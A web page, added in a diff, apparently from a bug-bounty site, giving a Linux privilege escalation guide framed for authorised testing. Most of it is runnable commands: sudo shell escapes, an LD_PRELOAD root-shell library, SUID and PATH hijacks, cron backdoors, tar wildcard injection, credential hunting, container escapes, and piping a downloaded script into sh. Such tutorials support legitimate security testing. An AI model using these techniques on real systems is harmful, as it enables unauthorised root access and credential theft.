@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- ME1: Dark mode — runs before render to prevent FOUC -->
+    <script>
+      (function() {
+        var saved = localStorage.getItem('theme');
+        if (saved) {
+          document.documentElement.setAttribute('data-theme', saved);
+        } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+          document.documentElement.setAttribute('data-theme', 'dark');
+          localStorage.setItem('theme', 'dark');
+        }
+      })();
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Step-by-step guide to Linux privilege escalation for bug bounty hunters and pentesters. Covers SUID binaries, kernel exploits, cron jobs, sudo misconfigurations, capabilities, writable paths, and container escapes with real-world examples.">
+    <title>Linux Privilege Escalation: A Practical Guide to Escalating Access on Real Targets</title>
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://bughuntertools.com/articles/linux-privilege-escalation-bug-bounty-guide-2026/">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://bughuntertools.com/articles/linux-privilege-escalation-bug-bounty-guide-2026/">
+    <meta property="og:title" content="Linux Privilege Escalation: A Practical Guide to Escalating Access on Real Targets">
+    <meta property="og:description" content="Step-by-step guide to Linux privilege escalation for bug bounty hunters and pentesters. Covers SUID binaries, kernel exploits, cron jobs, sudo misconfigurations, capabilities, writable paths, and container escapes with real-world examples.">
+    <meta property="og:site_name" content="Bug Hunter Tools">
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://bughuntertools.com/articles/linux-privilege-escalation-bug-bounty-guide-2026/">
+    <meta name="twitter:title" content="Linux Privilege Escalation: A Practical Guide to Escalating Access on Real Targets">
+    <meta name="twitter:description" content="Step-by-step guide to Linux privilege escalation for bug bounty hunters and pentesters. Covers SUID binaries, kernel exploits, cron jobs, sudo misconfigurations, capabilities, writable paths, and container escapes with real-world examples.">
+    
+    <!-- Google Fonts: Inter (UI) + JetBrains Mono (code) -->
+    <link rel="stylesheet" href="/css/fonts.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-PP6M3SZSVR"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-PP6M3SZSVR');
+    </script>
+    
+    <!-- AI Agent Referrer Tracking -->
+    <script>
+      (function() {
+        var ua = navigator.userAgent || '';
+        var ref = document.referrer || '';
+        var aiSource = null;
+        
+        // Detect AI agents by User-Agent
+        if (ua.includes('ChatGPT-User') || ua.includes('ChatGPT')) {
+          aiSource = 'chatgpt';
+        } else if (ua.includes('Claude') || ua.includes('Anthropic')) {
+          aiSource = 'claude';
+        } else if (ua.includes('PerplexityBot') || ua.includes('Perplexity')) {
+          aiSource = 'perplexity';
+        } else if (ua.includes('GPTBot')) {
+          aiSource = 'openai_crawler';
+        } else if (ua.includes('ClaudeBot') || ua.includes('anthropic-ai')) {
+          aiSource = 'anthropic_crawler';
+        } else if (ua.includes('Bard') || ua.includes('Gemini')) {
+          aiSource = 'google_gemini';
+        } else if (ref.includes('chat.openai.com')) {
+          aiSource = 'chatgpt_referrer';
+        } else if (ref.includes('claude.ai')) {
+          aiSource = 'claude_referrer';
+        } else if (ref.includes('perplexity.ai')) {
+          aiSource = 'perplexity_referrer';
+        }
+        
+        // Send custom event if AI agent detected
+        if (aiSource) {
+          gtag('event', 'ai_agent_visit', {
+            'ai_source': aiSource,
+            'page_path': window.location.pathname,
+            'user_agent': ua
+          });
+          
+          // Set custom dimension
+          gtag('set', {'ai_visitor': aiSource});
+          
+          // Log to console for debugging
+          console.log('AI Agent detected:', aiSource);
+        }
+      })();
+    </script>
+    
+    <!-- Affiliate Link Click Tracking -->
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        // Track clicks on Amazon affiliate links (tag=altclaw-20)
+        var links = document.querySelectorAll('a[href*="amazon.com"][href*="altclaw-20"]');
+        links.forEach(function(link) {
+          link.addEventListener('click', function(e) {
+            var href = this.href;
+            var asin = (href.match(/\/dp\/([A-Z0-9]{10})/) || [])[1] || 'unknown';
+            var label = this.textContent.trim().substring(0, 60) || asin;
+            gtag('event', 'affiliate_click', {
+              'event_category': 'affiliate',
+              'event_label': label,
+              'affiliate_product': asin,
+              'affiliate_program': 'amazon',
+              'page_path': window.location.pathname
+            });
+          });
+        });
+      });
+    </script>
+
+    <!-- Google AdSense Verification -->
+    <meta name="google-adsense-account" content="ca-pub-9373816755142401">
+
+    <!-- Google AdSense -->
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9373816755142401" crossorigin="anonymous"></script>
+    
+
+    <!-- Schema.org markup -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebPage",
+      "name": "Linux Privilege Escalation: A Practical Guide to Escalating Access on Real Targets",
+      "description": "Step-by-step guide to Linux privilege escalation for bug bounty hunters and pentesters. Covers SUID binaries, kernel exploits, cron jobs, sudo misconfigurations, capabilities, writable paths, and container escapes with real-world examples.",
+      "url": "https://bughuntertools.com/articles/linux-privilege-escalation-bug-bounty-guide-2026/"
+    }
+    </script>
+</head>
+<body>
+    <!-- Sticky Navigation Bar -->
+    <div class="sticky-nav">
+        <div class="container sticky-nav-inner">
+            <a href="/" class="sticky-nav-logo">🔍 Bug Hunter Tools</a>
+            <div class="sticky-nav-links">
+                <a href="/">Home</a>
+                <a href="/articles/">Articles</a>
+                <a href="/categories/">Categories</a>
+                <a href="/demos/">SecurityClaw Demos</a>
+                <a href="/articles/security-testing-tools-2026/">Tools</a>
+                <a href="/about/">About</a>
+                <a href="/privacy.html">Privacy</a>
+            </div>
+            <button class="dark-mode-toggle" aria-label="Toggle dark mode">🌙</button>
+        </div>
+    </div>
+
+    
+    <!-- Breadcrumb Navigation -->
+    <nav class="breadcrumb" aria-label="Breadcrumb">
+        <div class="container">
+            <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/">
+                        <span itemprop="name">Home</span>
+                    </a>
+                    <meta itemprop="position" content="1" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/articles/">
+                        <span itemprop="name">Articles</span>
+                    </a>
+                    <meta itemprop="position" content="2" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <span itemprop="name">Linux Privilege Escalation: A Practical Guide to Escalating Access on Real Targets</span>
+                    <meta itemprop="position" content="3" />
+                </li>
+            </ol>
+        </div>
+    </nav>
+    
+
+    
+
+    <main class="container">
+        <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "Article",
+      "headline": "Linux Privilege Escalation: A Practical Guide to Escalating Access on Real Targets",
+      "description": "Step-by-step guide to Linux privilege escalation for bug bounty hunters and pentesters. Covers SUID binaries, kernel exploits, cron jobs, sudo misconfigurations, capabilities, writable paths, and container escapes with real-world examples.",
+      "author": {
+        "@type": "Organization",
+        "name": "Bug Hunter Tools"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "Bug Hunter Tools",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "https://bughuntertools.com/images/logos/altclaw-logo-512.png"
+        }
+      },
+      "datePublished": "2026-04-15",
+      "dateModified": "2026-04-15"
+    },
+    {
+      "@type": "FAQPage",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "What is Linux privilege escalation?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Linux privilege escalation is the process of gaining higher-level permissions on a Linux system after obtaining initial access. This typically means going from a low-privilege user or web application shell to root access, exploiting misconfigurations, vulnerable software, or insecure file permissions."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "What are the most common Linux privilege escalation vectors?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "The most common vectors are: SUID/SGID binary abuse, sudo misconfigurations, writable cron jobs, kernel exploits, Linux capabilities abuse, writable PATH directories, NFS no_root_squash shares, and container/Docker escapes. Sudo misconfigurations and SUID binaries account for the majority of real-world findings."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "What tools are used for Linux privilege escalation enumeration?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "The most widely used tools are LinPEAS (comprehensive automated enumeration), linux-exploit-suggester (kernel exploit matching), pspy (process monitoring without root), and GTFOBins (reference for binary abuse). Manual enumeration with find, getcap, and sudo -l remains essential."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "How do you escalate privileges through sudo misconfigurations?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Run 'sudo -l' to list allowed commands. If any binary is allowed without password (NOPASSWD), check GTFOBins for known escalation techniques. Common examples include sudo vim (spawn shell via :!sh), sudo find (execute commands via -exec), and sudo env (bypass restrictions to run arbitrary commands)."
+          }
+        }
+      ]
+    },
+    {
+      "@type": "HowTo",
+      "name": "How to Escalate Privileges on Linux Systems",
+      "step": [
+        {"@type": "HowToStep", "name": "Enumerate the system", "text": "Gather OS version, kernel version, running services, installed packages, and network configuration."},
+        {"@type": "HowToStep", "name": "Check sudo permissions", "text": "Run sudo -l to identify commands you can run as root or other users."},
+        {"@type": "HowToStep", "name": "Find SUID/SGID binaries", "text": "Search for binaries with the SUID bit set that may allow privilege escalation."},
+        {"@type": "HowToStep", "name": "Inspect cron jobs and timers", "text": "Look for writable scripts executed by root via cron or systemd timers."},
+        {"@type": "HowToStep", "name": "Check capabilities and PATH", "text": "Enumerate Linux capabilities and writable directories in PATH."},
+        {"@type": "HowToStep", "name": "Look for credentials", "text": "Search configuration files, history files, and environment variables for passwords and keys."},
+        {"@type": "HowToStep", "name": "Check for kernel exploits", "text": "Match the kernel version against known exploits using linux-exploit-suggester."},
+        {"@type": "HowToStep", "name": "Escalate and document", "text": "Execute the escalation, capture proof, and write a clear report."}
+      ]
+    }
+  ]
+}
+</script>
+
+<article>
+
+<div class="key-takeaways">
+<h2>Key Takeaways</h2>
+<ul>
+<li><strong>sudo -l is your first command</strong> — sudo misconfigurations are the most common and easiest privesc vector on real targets</li>
+<li><strong>SUID binaries are everywhere</strong> — custom SUID binaries are almost always exploitable; check GTFOBins for standard ones</li>
+<li><strong>Cron jobs run as root</strong> — if you can write to a script that cron executes, you own the box</li>
+<li><strong>Kernel exploits are last resort</strong> — they crash systems and leave traces; exhaust misconfigurations first</li>
+<li><strong>Containers are not jails</strong> — Docker socket access, privileged mode, and host mounts all lead to escape</li>
+<li><strong>Automate enumeration, escalate manually</strong> — run LinPEAS for discovery, but understand each vector before exploiting</li>
+</ul>
+</div>
+
+<h2>Why Linux Privilege Escalation Matters for Bug Bounty</h2>
+
+<p>You got a shell. Maybe through command injection, an SSRF-to-RCE chain, or a deserialization bug. You're running as <code>www-data</code> or <code>nobody</code>. The report you write now says "Remote Code Execution" — but if you can escalate to root, it says "Full System Compromise." That's the difference between a medium and a critical finding.</p>
+
+<p>Most bug bounty programs with infrastructure scope explicitly reward privilege escalation. Even programs focused on web applications care when you can demonstrate that a web vulnerability chains into root access on the underlying server. This guide covers every practical technique you need.</p>
+
+<h2>Initial Enumeration — What to Check First</h2>
+
+<p>Before trying any escalation technique, gather information about the system. Every piece of data narrows down which vectors are viable.</p>
+
+<h3>System Information</h3>
+
+<pre><code># OS and kernel version — needed for kernel exploit matching
+uname -a
+cat /etc/os-release
+
+# Current user and groups
+id
+whoami
+groups
+
+# All users with shells
+grep -v '/nologin\|/false' /etc/passwd
+
+# Network — what's listening internally?
+ss -tlnp
+ip addr</code></pre>
+
+<h3>Quick Wins Checklist</h3>
+
+<p>Run these before anything else. They take seconds and catch the most common misconfigurations:</p>
+
+<pre><code># 1. Sudo permissions (most common vector)
+sudo -l
+
+# 2. SUID binaries
+find / -perm -4000 -type f 2>/dev/null
+
+# 3. Writable cron scripts
+ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null
+cat /etc/crontab
+
+# 4. Linux capabilities
+getcap -r / 2>/dev/null
+
+# 5. Writable /etc/passwd (instant root)
+ls -la /etc/passwd /etc/shadow</code></pre>
+
+<h2>Sudo Misconfigurations</h2>
+
+<p>This is the single most productive escalation vector. Run <code>sudo -l</code> on every target. If the output shows any binary you can run as root — especially with <code>NOPASSWD</code> — check <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a> immediately.</p>
+
+<h3>Common Exploitable Sudo Entries</h3>
+
+<pre><code># vim/vi — spawn a shell
+sudo vim -c ':!sh'
+
+# find — execute arbitrary commands
+sudo find /tmp -exec /bin/sh \;
+
+# env — bypass PATH restrictions
+sudo env /bin/sh
+
+# awk — execute system commands
+sudo awk 'BEGIN {system("/bin/sh")}'
+
+# less/more — shell escape
+sudo less /etc/shadow
+# then type: !sh
+
+# python/python3
+sudo python3 -c 'import os; os.system("/bin/sh")'
+
+# nmap (older versions with interactive mode)
+sudo nmap --interactive
+# then: !sh</code></pre>
+
+<h3>Sudo Environment Tricks</h3>
+
+<pre><code># If sudo preserves LD_PRELOAD (check with sudo -l)
+# Compile a shared library that spawns a shell:
+cat > /tmp/privesc.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setuid(0);
+    setgid(0);
+    system("/bin/sh");
+}
+EOF
+gcc -fPIC -shared -nostartfiles -o /tmp/privesc.so /tmp/privesc.c
+sudo LD_PRELOAD=/tmp/privesc.so <allowed_binary></code></pre>
+
+<h2>SUID/SGID Binary Abuse</h2>
+
+<p>SUID binaries run with the file owner's permissions — usually root. Custom SUID binaries are almost always exploitable. Standard ones may be exploitable depending on the version.</p>
+
+<pre><code># Find all SUID binaries
+find / -perm -4000 -type f 2>/dev/null
+
+# Find SGID binaries
+find / -perm -2000 -type f 2>/dev/null
+
+# Compare against GTFOBins list
+# Focus on anything non-standard — custom binaries are gold</code></pre>
+
+<h3>Exploiting Custom SUID Binaries</h3>
+
+<pre><code># Check what the binary does
+strings /usr/local/bin/custom-suid
+ltrace /usr/local/bin/custom-suid
+strace /usr/local/bin/custom-suid
+
+# If it calls system() or popen() with a relative path:
+# Create a malicious binary in PATH
+export PATH=/tmp:$PATH
+echo '#!/bin/sh' > /tmp/service
+echo '/bin/sh' >> /tmp/service
+chmod +x /tmp/service
+/usr/local/bin/custom-suid</code></pre>
+
+<h3>Known SUID Escalations</h3>
+
+<pre><code># pkexec (CVE-2021-4034 — PwnKit, still unpatched on many systems)
+# Check if pkexec is SUID
+ls -la /usr/bin/pkexec
+
+# base64 — read any file
+LFILE=/etc/shadow
+/usr/bin/base64 "$LFILE" | base64 -d
+
+# cp — overwrite /etc/passwd
+# Generate password hash: openssl passwd -1 newpass
+# Create modified passwd with root-level user
+/usr/bin/cp /tmp/modified-passwd /etc/passwd</code></pre>
+
+<h2>Cron Jobs and Systemd Timers</h2>
+
+<p>If root runs a script you can write to, you own the box. If root runs a script that sources files you can write to, same result.</p>
+
+<pre><code># System cron
+cat /etc/crontab
+ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
+
+# User crons
+crontab -l
+ls -la /var/spool/cron/crontabs/
+
+# Systemd timers
+systemctl list-timers --all
+
+# Watch for processes (catches cron jobs you can't see in files)
+# Use pspy: https://github.com/DominicBreuker/pspy
+./pspy64</code></pre>
+
+<h3>Exploiting Writable Cron Scripts</h3>
+
+<pre><code># If /opt/backup.sh is run by root cron and you can write to it:
+echo '#!/bin/bash' > /opt/backup.sh
+echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/backup.sh
+
+# Wait for cron to execute, then:
+/tmp/rootbash -p</code></pre>
+
+<h3>Wildcard Injection</h3>
+
+<pre><code># If cron runs: tar czf /backup/archive.tar.gz *
+# In the directory where tar runs with wildcard:
+echo "" > "--checkpoint=1"
+echo "" > "--checkpoint-action=exec=sh privesc.sh"
+echo '#!/bin/bash' > privesc.sh
+echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> privesc.sh</code></pre>
+
+<h2>Linux Capabilities</h2>
+
+<p>Capabilities are a finer-grained alternative to SUID. A binary with <code>cap_setuid+ep</code> can change its UID to root without being SUID.</p>
+
+<pre><code># Enumerate capabilities
+getcap -r / 2>/dev/null
+
+# Dangerous capabilities:
+# cap_setuid — change UID (direct root)
+# cap_setgid — change GID
+# cap_dac_override — bypass file permission checks
+# cap_dac_read_search — read any file
+# cap_net_raw — raw sockets (sniffing)
+# cap_sys_admin — mount filesystems, many kernel operations
+# cap_sys_ptrace — trace/debug any process</code></pre>
+
+<h3>Exploiting cap_setuid</h3>
+
+<pre><code># If python3 has cap_setuid+ep:
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+# If perl has cap_setuid+ep:
+perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/sh";'</code></pre>
+
+<h2>Credential Hunting</h2>
+
+<p>Passwords and keys are scattered across Linux systems. Developers leave them in configuration files, history files, environment variables, and backup archives.</p>
+
+<pre><code># History files
+cat ~/.bash_history ~/.zsh_history ~/.mysql_history 2>/dev/null
+
+# Configuration files with passwords
+grep -ri "password\|passwd\|pass\|secret\|key\|token" /etc/ /opt/ /var/www/ /home/ 2>/dev/null | grep -v "Binary"
+
+# SSH keys
+find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
+
+# Environment variables
+env
+cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i "pass\|key\|secret\|token"
+
+# Database credentials
+cat /var/www/*/wp-config.php /var/www/*/.env /opt/*/.env 2>/dev/null
+
+# Backup files
+find / -name "*.bak" -o -name "*.old" -o -name "*.backup" -o -name "*.sql" 2>/dev/null</code></pre>
+
+<h2>Writable PATH and Library Hijacking</h2>
+
+<pre><code># Check if any directory in root's PATH is writable
+echo $PATH | tr ':' '\n' | xargs -I{} ls -ld {} 2>/dev/null
+
+# If a root-executed script calls a binary without full path
+# and you can write to a PATH directory that comes first:
+echo '#!/bin/sh' > /writable-path-dir/service
+echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /writable-path-dir/service
+chmod +x /writable-path-dir/service
+
+# Shared library hijacking
+# If a SUID binary loads a library from a writable location:
+ldd /usr/local/bin/suid-binary
+# Look for "not found" libraries or writable library paths</code></pre>
+
+<h2>Kernel Exploits</h2>
+
+<p>Kernel exploits should be your last resort. They can crash the system, leave forensic traces, and may not work reliably. But when nothing else works, they're the path to root.</p>
+
+<pre><code># Get kernel version
+uname -r
+
+# Use linux-exploit-suggester
+./linux-exploit-suggester.sh
+
+# Notable kernel exploits (check if target is vulnerable):
+# DirtyPipe (CVE-2022-0847) — Linux 5.8 to 5.16.11
+# DirtyCow (CVE-2016-5195) — Linux 2.x through 4.x
+# PwnKit (CVE-2021-4034) — polkit pkexec (not strictly kernel)
+# GameOver(lay) (CVE-2023-2640, CVE-2023-32629) — Ubuntu OverlayFS</code></pre>
+
+<h2>Container Escapes</h2>
+
+<p>If you're inside a Docker container or Kubernetes pod, escalation means escaping to the host.</p>
+
+<pre><code># Am I in a container?
+cat /proc/1/cgroup 2>/dev/null | grep -i "docker\|lxc\|kubepods"
+ls -la /.dockerenv 2>/dev/null
+hostname  # Random hex = likely container
+
+# Docker socket mounted (instant host root)
+ls -la /var/run/docker.sock
+# If accessible:
+docker run -v /:/host --rm -it alpine chroot /host sh
+
+# Privileged container
+ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" || echo "unprivileged"
+# If privileged:
+mkdir /tmp/hostfs && mount /dev/sda1 /tmp/hostfs
+chroot /tmp/hostfs
+
+# Host PID namespace
+ls /proc/1/root/  # If you can see host filesystem
+
+# Kubernetes service account token
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+# Use kubectl with the token to check cluster permissions</code></pre>
+
+<h2>NFS Misconfigurations</h2>
+
+<pre><code># Check for NFS shares
+showmount -e target-ip
+cat /etc/exports
+
+# If no_root_squash is set:
+# Mount the share on your machine as root
+mkdir /tmp/nfs && mount -t nfs target-ip:/share /tmp/nfs
+# Create a SUID binary on the share
+cp /bin/bash /tmp/nfs/rootbash
+chmod +s /tmp/nfs/rootbash
+# On the target, execute:
+/share/rootbash -p</code></pre>
+
+<h2>Automated Enumeration Tools</h2>
+
+<h3>LinPEAS</h3>
+
+<pre><code># Download and run
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Or transfer to target and run
+chmod +x linpeas.sh
+./linpeas.sh -a 2>&1 | tee linpeas-output.txt</code></pre>
+
+<h3>linux-exploit-suggester</h3>
+
+<pre><code>chmod +x linux-exploit-suggester.sh
+./linux-exploit-suggester.sh</code></pre>
+
+<h3>pspy — Process Monitoring</h3>
+
+<pre><code># Catches cron jobs and processes you can't see with ps
+./pspy64
+# Watch for root-executed processes with writable scripts</code></pre>
+
+<h2>Escalation Methodology — Putting It Together</h2>
+
+<ol>
+<li><strong>Enumerate</strong> — Run <code>sudo -l</code>, find SUID binaries, check capabilities, list cron jobs</li>
+<li><strong>Quick wins</strong> — Check writable /etc/passwd, Docker socket, sudo NOPASSWD entries</li>
+<li><strong>Credential hunt</strong> — Search history files, config files, environment variables, SSH keys</li>
+<li><strong>Misconfigurations</strong> — Writable cron scripts, PATH hijacking, NFS no_root_squash</li>
+<li><strong>Kernel exploits</strong> — Only if nothing else works; match kernel version to known CVEs</li>
+<li><strong>Document everything</strong> — Screenshot each step for your report</li>
+</ol>
+
+<h2>Writing the Report</h2>
+
+<p>A privilege escalation finding needs to clearly show the chain from initial access to root. Include:</p>
+
+<ul>
+<li><strong>Initial access method</strong> — how you got the low-privilege shell</li>
+<li><strong>Enumeration findings</strong> — what misconfiguration you found</li>
+<li><strong>Exploitation steps</strong> — exact commands used to escalate</li>
+<li><strong>Proof of root</strong> — <code>id</code> output showing uid=0, contents of /root/proof.txt or equivalent</li>
+<li><strong>Impact statement</strong> — what root access means for this specific target (data access, lateral movement, persistence)</li>
+<li><strong>Remediation</strong> — specific fix for the misconfiguration (remove SUID bit, fix sudo entry, patch kernel)</li>
+</ul>
+
+<h2>Further Reading</h2>
+
+<ul>
+<li><a href="/articles/windows-privilege-escalation-bug-bounty-guide-2026/">Windows Privilege Escalation Guide</a> — the Windows counterpart to this guide</li>
+<li><a href="/articles/command-injection-hunting-bug-bounty-guide-2026/">Command Injection Hunting Guide</a> — getting the initial shell to escalate from</li>
+<li><a href="/articles/container-security-testing-bug-bounty-guide-2026/">Container Security Testing</a> — deep dive on container escape techniques</li>
+<li><a href="/articles/cloud-pentesting-methodology-bug-bounty-guide-2026/">Cloud Pentesting Methodology</a> — cloud misconfigurations that chain with Linux privesc</li>
+<li><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a> — the definitive reference for Unix binary exploitation</li>
+</ul>
+
+</article>
+
+
+        
+        
+        <div class="ad-container ad-below-article">
+            <p class="ad-label">Advertisement</p>
+            <ins class="adsbygoogle"
+                 style="display:block"
+                 data-ad-client="ca-pub-9373816755142401"
+                 data-ad-slot="9879569728"
+                 data-ad-format="auto"
+                 data-full-width-responsive="true"></ins>
+            <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+        </div>
+        
+        
+    </main>
+
+    <footer>
+        <div class="container footer-inner">
+            <span class="footer-updated">Last updated: 16 Apr 2026, 08:48 GMT</span>
+            <p>&copy; 2026 Bug Hunter Tools. All rights reserved. | <a href="/privacy.html" style="color: white;">Privacy Policy</a></p>
+        </div>
+    </footer>
+
+    <!-- ME1: Dark mode toggle handler -->
+    <script>
+      (function() {
+        var btn = document.querySelector('.dark-mode-toggle');
+        if (!btn) return;
+        function updateBtn() {
+          var dark = document.documentElement.getAttribute('data-theme') === 'dark';
+          btn.textContent = dark ? '☀️' : '🌙';
+          btn.setAttribute('aria-label', dark ? 'Switch to light mode' : 'Switch to dark mode');
+        }
+        updateBtn();
+        btn.addEventListener('click', function() {
+          var next = (document.documentElement.getAttribute('data-theme') === 'dark') ? 'light' : 'dark';
+          document.documentElement.setAttribute('data-theme', next);
+          localStorage.setItem('theme', next);
+          updateBtn();
+        });
+      })();
+    </script>
+
+    <!-- ME2: Article hero header + reading time badge -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = path.startsWith('/articles/') && path !== '/articles/';
+        var isDemo    = path.startsWith('/demos/')    && path !== '/demos/';
+        if (!isArticle && !isDemo) return;
+        var article = document.querySelector('article');
+        if (!article) return;
+        var text  = article.innerText || '';
+        var words = text.trim().split(/\s+/).filter(Boolean).length;
+        var mins  = Math.max(1, Math.round(words / 238));
+        var badge = '<span class="reading-time-badge">&#9201; ' + mins + ' min read</span>';
+        var header = article.querySelector('header');
+        if (!header) return;
+        header.classList.add('article-hero-header');
+        var metaEl = header.querySelector('.meta, .article-meta');
+        if (metaEl) {
+          metaEl.classList.add('article-hero-meta');
+          metaEl.insertAdjacentHTML('beforeend', ' &middot; ' + badge);
+        } else {
+          var h1 = header.querySelector('h1');
+          if (h1) {
+            var div = document.createElement('div');
+            div.className = 'article-hero-meta';
+            div.innerHTML = badge;
+            header.appendChild(div);
+          }
+        }
+      })();
+    </script>
+
+    <!-- BR2: Sidebar Table of Contents — IntersectionObserver highlight -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        // Build the ToC from headings/sections inside article
+        function buildSidebarToC() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          // Collect anchor targets + labels.
+          // Support two patterns:
+          //   (a) <h2 id="..."> / <h3 id="..."> — explicit IDs on headings
+          //   (b) <section id="..."><h2>...</h2> — IDs on parent sections (older articles)
+          var entries = [];
+
+          // Pass (a): headings with own IDs
+          article.querySelectorAll('h2[id], h3[id]').forEach(function(h) {
+            entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+          });
+
+          // Pass (b): sections with IDs whose h2 has no id yet
+          if (entries.length < 3) {
+            entries = [];
+            article.querySelectorAll('section[id]').forEach(function(sec) {
+              var h = sec.querySelector('h2, h3');
+              if (!h) return;
+              // Ensure heading has the id so IntersectionObserver works
+              if (!h.id) h.id = sec.id;
+              entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+            });
+          }
+
+          if (entries.length < 3) return; // not worth showing
+
+          // Add has-toc-sidebar class to main
+          var mainEl = document.querySelector('main');
+          if (mainEl) mainEl.classList.add('has-toc-sidebar');
+
+          // Build sidebar element
+          var sidebar = document.createElement('nav');
+          sidebar.className = 'toc-sidebar';
+          sidebar.setAttribute('aria-label', 'Table of contents');
+
+          var header = document.createElement('div');
+          header.className = 'toc-sidebar-header';
+          header.textContent = 'In this article';
+          sidebar.appendChild(header);
+
+          var list = document.createElement('ul');
+          list.className = 'toc-sidebar-list';
+
+          entries.forEach(function(e) {
+            var li = document.createElement('li');
+            li.className = 'toc-sidebar-item' + (e.level === 'H3' ? ' toc-sidebar-item--sub' : '');
+            li.setAttribute('data-heading-id', e.id);
+
+            var a = document.createElement('a');
+            a.href = '#' + e.id;
+            a.textContent = e.text.replace(/^[0-9]+\.\s*/, ''); // strip leading "1. "
+            li.appendChild(a);
+            list.appendChild(li);
+          });
+
+          sidebar.appendChild(list);
+
+          // Append sidebar to main (grid places it to the right)
+          if (mainEl) mainEl.appendChild(sidebar);
+
+          // IntersectionObserver — highlight active heading
+          var items = sidebar.querySelectorAll('.toc-sidebar-item[data-heading-id]');
+          var activeId = null;
+
+          var observer = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+              if (entry.isIntersecting) {
+                activeId = entry.target.id;
+              }
+            });
+
+            items.forEach(function(item) {
+              item.classList.toggle(
+                'toc-sidebar-item--active',
+                item.getAttribute('data-heading-id') === activeId
+              );
+            });
+          }, {
+            rootMargin: '-20% 0px -75% 0px',
+            threshold: 0
+          });
+
+          entries.forEach(function(e) { observer.observe(e.el); });
+
+          // Smooth scroll for sidebar links
+          sidebar.addEventListener('click', function(e) {
+            var a = e.target.closest('a');
+            if (!a) return;
+            var id = a.getAttribute('href').replace('#', '');
+            var target = document.getElementById(id);
+            if (target) {
+              e.preventDefault();
+              target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+              history.replaceState(null, '', '#' + id);
+            }
+          });
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', buildSidebarToC);
+        } else {
+          buildSidebarToC();
+        }
+      })();
+    </script>
+
+    <!-- ME3: Inline ad injection — inserts 2 ads per article (post-intro + mid-article) -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        var pubId  = 'ca-pub-9373816755142401';
+        var slotId = '9879569728';
+        if (!pubId || !slotId) return;
+
+        function createAdUnit(label) {
+          var wrapper = document.createElement('div');
+          wrapper.className = 'ad-container ad-inline';
+          wrapper.setAttribute('data-ad-label', label);
+          wrapper.innerHTML =
+            '<ins class="adsbygoogle"' +
+            ' style="display:block"' +
+            ' data-ad-client="' + pubId + '"' +
+            ' data-ad-slot="' + slotId + '"' +
+            ' data-ad-format="auto"' +
+            ' data-full-width-responsive="true"></ins>';
+          return wrapper;
+        }
+
